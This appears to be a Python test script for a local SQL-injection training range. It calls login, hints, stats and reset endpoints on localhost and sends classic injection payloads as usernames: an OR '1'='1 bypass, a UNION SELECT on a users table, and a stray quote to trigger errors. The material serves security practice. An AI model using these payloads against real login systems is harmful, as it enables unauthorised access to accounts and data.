import requests
import json
from requests.exceptions import RequestException

BASE_URL = 'http://localhost:3000'

def safe_request(method, url, **kwargs):
    """安全的请求包装器"""
    try:
        response = requests.request(method, url, timeout=10, **kwargs)
        response.raise_for_status()
        return response.json()
    except RequestException as e:
        print(f'请求错误: {str(e)}')
        return None

def test_login(username, password):
    """测试登录功能"""
    print(f'\n测试登录: {username} / {password}')
    result = safe_request('POST', f'{BASE_URL}/login', data={
        'username': username,
        'password': password
    })
    if result:
        print('响应:', json.dumps(result, ensure_ascii=False, indent=2))
    return result

def test_hints():
    """测试提示系统"""
    print('\n获取提示:')
    result = safe_request('GET', f'{BASE_URL}/hints')
    if result:
        print('响应:', json.dumps(result, ensure_ascii=False, indent=2))
    return result

def test_stats():
    """测试统计信息"""
    print('\n获取统计:')
    result = safe_request('GET', f'{BASE_URL}/stats')
    if result:
        print('响应:', json.dumps(result, ensure_ascii=False, indent=2))
    return result

def test_reset():
    """测试重置功能"""
    print('\n重置进度:')
    result = safe_request('POST', f'{BASE_URL}/reset')
    if result:
        print('响应:', json.dumps(result, ensure_ascii=False, indent=2))
    return result

def run_tests():
    """运行所有测试"""
    print('开始测试靶场API...\n')
    
    print('=== 1. 测试正常登录 ===')
    test_login('admin', 'admin123')
    
    print('\n=== 2. 测试SQL注入 ===')
    print('\na) 基础注入:')
    test_login("admin' OR '1'='1", 'anything')
    
    print('\nb) UNION注入:')
    test_login("' UNION SELECT 1,'admin','admin123' FROM users--", 'anything')
    
    print('\nc) 错误注入:')
    test_login("admin'", 'anything')
    
    print('\n=== 3. 测试提示系统 ===')
    test_hints()
    
    print('\n=== 4. 测试统计信息 ===')
    test_stats()
    
    print('\n=== 5. 测试重置功能 ===')
    test_reset()
    
    print('\n测试完成!')

if __name__ == '__main__':
    run_tests() 